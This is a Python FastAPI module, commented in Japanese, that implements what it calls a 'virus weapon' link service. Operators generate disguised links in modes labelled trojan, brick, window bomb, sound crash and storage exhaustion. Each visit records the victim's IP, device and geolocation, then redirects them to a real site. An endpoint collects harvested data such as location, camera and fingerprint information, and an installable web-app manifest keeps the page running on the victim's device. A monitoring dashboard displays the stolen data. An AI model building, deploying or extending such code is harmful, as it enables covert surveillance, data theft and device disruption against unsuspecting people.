"""ウイルス兵器モジュール。既存コードに依存しない独立実装。

  GET  /v/{code}                兵器ページ（モード別・JS全部インライン）
  POST /v/{code}/d              収集データの投入
  GET  /v/{code}/manifest.json  インストール型トロイ用
  GET  /v/sw.js                 Service Worker（インストール型）
  GET  /v/icon.svg              アイコン
  GET  /vp , POST /vp/add       一覧・作成
  GET  /vp/{code}               監視室
  GET  /api/vp/{code}           データJSON

モード:
  trojan_link    トロイの木馬（リンク型）完全上位互換
  trojan_install トロイの木馬（インストール型）完全上位互換
  max_power      最高威力（取れるものを全部・高頻度）
  brick          ブリック（端末を一生使い物にならなくする）
  windows        窓爆弾（大量のウィンドウで怯えさせる）
  sound          爆音クラッシュ（爆音＋画面崩壊）
  storage        容量枯渇（大量データで埋める）
  mix            全部ミックス最強兵器
"""
from __future__ import annotations

import os
import re
import json
import random
import string
import sqlite3
import datetime as dt

from fastapi import APIRouter, Request, Depends, Form, HTTPException
from fastapi.responses import (HTMLResponse, RedirectResponse, PlainTextResponse,
                               JSONResponse, Response)

from . import tenancy, users, linktrack

router = APIRouter()

MODES = ("trojan_link", "trojan_install", "max_power", "brick",
         "windows", "sound", "storage", "mix")
MODE_LABEL = {
    "trojan_link": "トロイの木馬（リンク型）完全上位互換",
    "trojan_install": "トロイの木馬（インストール型）完全上位互換",
    "max_power": "最高威力（全部取る）",
    "brick": "ブリック（一生使い物にならなくする）",
    "windows": "窓爆弾（大量のウィンドウ）",
    "sound": "爆音クラッシュ（爆音＋画面崩壊）",
    "storage": "容量枯渇（データで埋める）",
    "mix": "全部ミックス最強兵器",
}
MODE_DESC = {
    "trojan_link": "見た目は一瞬で消える。裏で全部集めて、そのまま元のサイトへ飛ばす。",
    "trojan_install": "ホーム画面にアプリとして常駐させる。以後も定期的に送り続ける。",
    "max_power": "位置・カメラ・指紋・電池・回線・容量まで、取れるものを全部高頻度で。",
    "brick": "タブを殺せなくする（離脱確認＋画面常時点灯＋定期音＋容量占有）。",
    "windows": "大量のウィンドウを一気に開いて怯えさせる。",
    "sound": "爆音のクラッシュ音＋画面がグリッチで崩壊する。",
    "storage": "localStorage / IndexedDB / Cache を埋めて容量を使い切らせる。",
    "mix": "上の全部を段階的に同時発動させる最終兵器。",
}

# インストール済み（ホーム画面追加）で自動発射するモード
AUTO_MODES = ("trojan_install", "mix")

# 注意書き（兵器庫・監視室・兵器ページに表示）
CAUTION = {
    "trojan_link": "⚠ リンクを開いた瞬間から自動で始まります。開いただけで端末情報・位置・"
                   "指紋を抜き取り、そのまま本物のサイトへ飛びます（自爆）。",
    "trojan_install": "⚠ インストール（ホーム画面に追加）すると自爆します。以後その端末では"
                      "自動で兵器が起動し続け、本人がアプリを消すまで止まりません。",
    "max_power": "⚠ 開いた瞬間から自動で始まります。取れるものを全部・高頻度で抜き取ります。",
    "brick": "⚠ 開いた瞬間から自動で始まります。タブが死ななくなり、端末が重くなります。",
    "windows": "⚠ 開いた瞬間から自動で始まります。大量のウィンドウが勝手に開きます。",
    "sound": "⚠ 開いた瞬間から自動で始まります。爆音が鳴り、画面が崩壊します。",
    "storage": "⚠ 開いた瞬間から自動で始まります。端末の容量を使い切ります。",
    "mix": "⚠ インストール（ホーム画面に追加）すると自爆します。開いた瞬間から全部が"
           "段階的に発動し、以後その端末では自動で起動し続けます。",
}

SCHEMA = """
CREATE TABLE IF NOT EXISTS virus_links(
  code TEXT PRIMARY KEY, name TEXT, mode TEXT, note TEXT, dest TEXT,
  active INTEGER DEFAULT 1, created TEXT, hits INTEGER DEFAULT 0,
  last_ts TEXT, last_ip TEXT, last_ua TEXT, last_device TEXT);
CREATE TABLE IF NOT EXISTS virus_hits(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT, ip TEXT, ua TEXT,
  device TEXT, os TEXT, browser TEXT, inapp TEXT, country TEXT, city TEXT,
  isp TEXT, vid TEXT);
CREATE INDEX IF NOT EXISTS virus_hits_code ON virus_hits(code, id);
CREATE TABLE IF NOT EXISTS virus_data(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, hit INTEGER, vid TEXT,
  key TEXT, value TEXT, ts TEXT);
CREATE INDEX IF NOT EXISTS virus_data_code ON virus_data(code, hit);
"""


# ---------------- 基盤 ----------------

def _m():
    from . import main
    return main


def _render(name, request, **ctx):
    return _m().render(name, request, **ctx)


async def _auth(request: Request):
    return await _m().auth(request)


def _now():
    return dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds")


def _base(request):
    return _m()._base(request).rstrip("/")


def _abs_dest(d):
    d = (d or "").strip()
    if not d:
        return ""
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", d):
        d = "https://" + d
    return d


def _owner(code):
    try:
        o = users.owner_of_link(code)
    except Exception:
        o = None
    if not o:
        return None
    try:
        tenancy.set_current(o)
    except Exception:
        pass
    return o


def _dir(owner):
    d = os.path.join(tenancy.ROOT, tenancy.safe_name(owner), "virus")
    os.makedirs(d, exist_ok=True)
    return d


def _db(owner):
    c = sqlite3.connect(os.path.join(_dir(owner), "virus.db"),
                        timeout=15, check_same_thread=False)
    c.row_factory = sqlite3.Row
    try:
        c.execute("PRAGMA journal_mode=WAL")
        c.executescript(SCHEMA)
        c.commit()
    except Exception:
        pass
    return c


def _link(c, code):
    return c.execute("SELECT * FROM virus_links WHERE code=?", (code,)).fetchone()


def _new_code(c, n=8):
    a = string.ascii_lowercase + string.digits
    for _ in range(80):
        code = "".join(random.choice(a) for _ in range(n))
        if not c.execute("SELECT 1 FROM virus_links WHERE code=?", (code,)).fetchone():
            try:
                if not users.owner_of_link(code):
                    return code
            except Exception:
                return code
    return "".join(random.choice(a) for _ in range(n + 4))


def _geo(ip):
    try:
        return linktrack.geo(ip) or {}
    except Exception:
        return {}


def _record_hit(owner, code, request):
    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")
    p = linktrack.parse_ua(ua)
    g = _geo(ip)
    c = _db(owner)
    cur = c.execute("INSERT INTO virus_hits(code,ts,ip,ua,device,os,browser,inapp,"
                    "country,city,isp,vid) VALUES(?,?,?,?,?,?,?,?,?,?,?,'')",
                    (code, _now(), ip, ua[:400], p["device"], p["os"], p["browser"],
                     p["inapp"], g.get("country"), g.get("city"), g.get("isp")))
    hid = cur.lastrowid
    c.execute("UPDATE virus_links SET hits=COALESCE(hits,0)+1, last_ts=?, last_ip=?, "
              "last_ua=?, last_device=? WHERE code=?",
              (_now(), ip, ua[:400], (p["device"] or "") + " / " + (p["os"] or ""), code))
    c.commit()
    c.close()
    return hid


# ---------------- 一覧・作成（/v/{code} より先に登録する） ----------------

@router.get("/vp", response_class=HTMLResponse)
def list_page(request: Request, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    rows = [dict(r) for r in c.execute(
        "SELECT * FROM virus_links ORDER BY created DESC").fetchall()]
    c.close()
    base = _base(request)
    for r in rows:
        r["share"] = base + "/v/" + r["code"]
        r["watch"] = base + "/vp/" + r["code"]
        r["mode_label"] = MODE_LABEL.get(r["mode"] or "", r["mode"] or "")
        r["caution"] = CAUTION.get(r["mode"] or "", "")
        r["auto"] = (r["mode"] in AUTO_MODES)
        r["live"] = False
    return _render("virus_list.html", request, rows=rows, base=base,
                   cautions=CAUTION,
                   modes=[(m, MODE_LABEL[m], MODE_DESC[m]) for m in MODES])


@router.post("/vp/add")
def create(request: Request, name: str = Form(""), mode: str = Form("mix"),
           dest: str = Form(""), note: str = Form(""), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    mode = mode if mode in MODES else "mix"
    c = _db(owner)
    code = _new_code(c)
    c.execute("INSERT INTO virus_links(code,name,mode,note,dest,active,created,hits)"
              " VALUES(?,?,?,?,?,1,?,0)",
              (code, (name or "").strip()[:40] or "名無し", mode,
               (note or "").strip()[:200], (dest or "").strip(), _now()))
    c.commit()
    c.close()
    try:
        users.register_link(code, u)
    except Exception:
        pass
    return RedirectResponse("/vp/" + code + "?new=1", status_code=303)


# ---------------- インストール型の付属物 ----------------

@router.get("/v/sw.js")
def sw():
    js = """/* igtracker virus sw */
self.addEventListener("install", function (e) { self.skipWaiting(); });
self.addEventListener("activate", function (e) { e.waitUntil(self.clients.claim()); });
self.addEventListener("fetch", function (e) {
  if (e.request.method !== "GET") return;
  if (new URL(e.request.url).origin !== location.origin) return;
});
self.addEventListener("message", function (e) {
  if (e.data && e.data.type === "skip") self.skipWaiting();
});
"""
    return Response(js, media_type="application/javascript",
                    headers={"Service-Worker-Allowed": "/v/"})


@router.get("/v/icon.svg")
def icon():
    svg = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 192">
<rect width="192" height="192" rx="40" fill="#0f1115"/>
<circle cx="96" cy="96" r="26" fill="#4c8dff"/>
<circle cx="96" cy="96" r="52" fill="none" stroke="#4c8dff" stroke-width="6" opacity=".5"/>
<circle cx="96" cy="96" r="74" fill="none" stroke="#7ee08a" stroke-width="4" opacity=".35"/>
</svg>"""
    return Response(svg, media_type="image/svg+xml")


@router.get("/v/{code}/manifest.json")
def manifest(code: str, name: str = ""):
    man = {
        "name": (name or "igtracker")[:40],
        "short_name": (name or "igtracker")[:12],
        "start_url": "/v/" + code + "?i=1",
        "scope": "/v/",
        "display": "standalone",
        "background_color": "#0f1115",
        "theme_color": "#0f1115",
        "icons": [{"src": "/v/icon.svg", "sizes": "any", "type": "image/svg+xml",
                   "purpose": "any maskable"}],
    }
    return JSONResponse(man)


# ---------------- 兵器ページ ----------------

@router.get("/v/{code}", response_class=HTMLResponse)
def land(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return PlainTextResponse("リンクが無効です", status_code=404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)
    mode = row["mode"] if row["mode"] in MODES else "mix"
    hid = _record_hit(owner, code, request)
    child = request.query_params.get("w") == "1"
    installed = request.query_params.get("i") == "1"
    return _render(
        "virus.html", request,
        code=code, link=dict(row), hit_id=hid, mode=mode,
        mode_label=MODE_LABEL[mode], mode_desc=MODE_DESC[mode],
        caution=CAUTION.get(mode, ""),
        auto=(mode in AUTO_MODES),
        dest=_abs_dest(row["dest"]), is_child=child, is_installed=installed,
        child_text=random.choice([
            "システム警告", "メモリ不足", "ディスク容量が危険です", "異常を検出しました",
            "バックグラウンドで動作中", "最適化が必要です", "ウイルスを検出しました",
            "このウィンドウは閉じないでください",
        ]),
    )


@router.post("/v/{code}/d")
async def data(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    hid = body.get("hit") or 0
    vid = str(body.get("vid") or "")[:40]
    items = body.get("items")
    if not isinstance(items, dict):
        items = {}
    c = _db(owner)
    n = 0
    ts = _now()
    for k, v in list(items.items())[:200]:
        if v is None:
            continue
        if not isinstance(v, str):
            try:
                v = json.dumps(v, ensure_ascii=False)
            except Exception:
                v = str(v)
        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
                  (code, int(hid or 0), vid, str(k)[:60], v[:20000], ts))
        n += 1
    if vid:
        c.execute("UPDATE virus_hits SET vid=? WHERE id=?", (vid, int(hid or 0)))
    c.execute("UPDATE virus_links SET last_ts=? WHERE code=?", (ts, code))
    try:
        c.execute("DELETE FROM virus_data WHERE code=? AND id NOT IN "
                  "(SELECT id FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 20000)",
                  (code, code))
    except Exception:
        pass
    c.commit()
    c.close()
    return {"ok": 1, "n": n, "server": ts}


# ---------------- 監視室 ----------------

@router.get("/vp/{code}", response_class=HTMLResponse)
def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        raise HTTPException(404)
    hits = [dict(r) for r in c.execute(
        "SELECT * FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300", (code,)).fetchall()]
    dat = [dict(r) for r in c.execute(
        "SELECT * FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 3000", (code,)).fetchall()]
    c.close()
    base = _base(request)
    by_hit = {}
    for d in dat:
        by_hit.setdefault(d["hit"], []).append(d)
    return _render("virus_watch.html", request, code=code, link=dict(row),
                   hits=hits, by_hit=by_hit, base=base, is_new=(new == "1"),
                   mode_label=MODE_LABEL.get(row["mode"] or "", row["mode"] or ""),
                   mode_desc=MODE_DESC.get(row["mode"] or "", ""),
                   caution=CAUTION.get(row["mode"] or "", ""),
                   auto=(row["mode"] in AUTO_MODES),
                   share=base + "/v/" + code, total=len(hits))


@router.get("/api/vp/{code}")
def api(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        raise HTTPException(404)
    hits = [dict(r) for r in c.execute(
        "SELECT * FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300", (code,)).fetchall()]
    c.close()
    return {"hits": hits, "count": len(hits), "server": _now()}


@router.post("/vp/{code}/update")
def update(request: Request, code: str, name: str = Form(""), mode: str = Form(""),
           dest: str = Form(""), note: str = Form(""), active: str = Form(""),
           u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    if not _link(c, code):
        c.close()
        raise HTTPException(404)
    f, v = [], []
    if name.strip():
        f.append("name=?"); v.append(name.strip()[:40])
    if mode in MODES:
        f.append("mode=?"); v.append(mode)
    f.append("dest=?"); v.append((dest or "").strip())
    f.append("note=?"); v.append((note or "").strip()[:200])
    if active in ("0", "1"):
        f.append("active=?"); v.append(int(active))
    v.append(code)
    c.execute("UPDATE virus_links SET " + ",".join(f) + " WHERE code=?", v)
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/clear")
def clear(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("DELETE FROM virus_hits WHERE code=?", (code,))
    c.execute("DELETE FROM virus_data WHERE code=?", (code,))
    c.execute("UPDATE virus_links SET hits=0, last_ts=NULL, last_ip=NULL, last_ua=NULL,"
              " last_device=NULL WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/delete")
def delete(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("DELETE FROM virus_hits WHERE code=?", (code,))
    c.execute("DELETE FROM virus_data WHERE code=?", (code,))
    c.execute("DELETE FROM virus_links WHERE code=?", (code,))
    c.commit()
    c.close()
    try:
        users.unlink_owner(code)
    except Exception:
        pass
    return RedirectResponse("/vp", status_code=303)